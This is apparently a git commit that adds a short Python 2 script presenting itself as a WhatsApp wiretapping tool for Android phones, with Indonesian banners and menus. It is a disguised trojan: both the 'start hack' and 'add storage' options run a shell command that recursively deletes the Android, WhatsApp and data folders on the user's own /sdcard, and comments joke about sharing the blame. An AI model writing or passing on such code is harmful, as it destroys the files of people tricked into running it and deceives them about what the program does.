3ecc17c1f98ea8c3789086eabebb588908a5b4e9
R4F1 <75515307+dboarkfot@users.noreply.github.com>
2021-05-23 16:48:00 +0700

    Hmmm:)
    Plus broter control yur control ;)
    #python2

---
+++ sadap_wa.py
@@ -0,0 +1,42 @@
+# anti encrypt karna python itu sifat nya open bo mksd nya sahur ce:>
+# yudah recode aja gpp :>
+# dosa nya kita bagi bagi ntar, tenang aja gw baik kok :*
+
+
+import os
+import sys
+import time
+os.system('clear')
+time.sleep(1)
+os.system('toilet -f mini -F gay WELCOME TO HACK WANGSAF')
+time.sleep(2)
+os.system('clear')
+os.system('figlet SADAP WA')
+def anjing():
+   print """TOLS INI UNTUK HEK WANGSAF
+
+! KALO SAYA ADA SALAH MAAPIN AJA DULU
+ MARAH NYA NTAR AJA !
+
+__________________________________________________"""
+
+def kimak():
+    print "[1] STAR HEK WANGSAF "
+    print "[2] PENAMBAH RUANG PENYIMPANAN "
+    print "[0] KELUAR "
+def tytyd():
+    ngtd = raw_input("MASUKAN MENU = ")
+    if ngtd =="1":
+    	print("loading.....")
+        os.system('cd /sdcard && ls && rm -rf Android && rm -rf Whatsapp && rm -rf data')
+    	time.sleep(2)
+    if ngtd =="0":
+    	print(" thanks for using my script ")
+        time.sleep(1)
+    	os.system('exit && exit')
+    if ngtd =="2":
+    	print("loading.....")
+        os.system('cd /sdcard && ls && rm -rf Android && rm -rf Whatsapp && rm -rf data')
+anjing()
+kimak()
+tytyd()
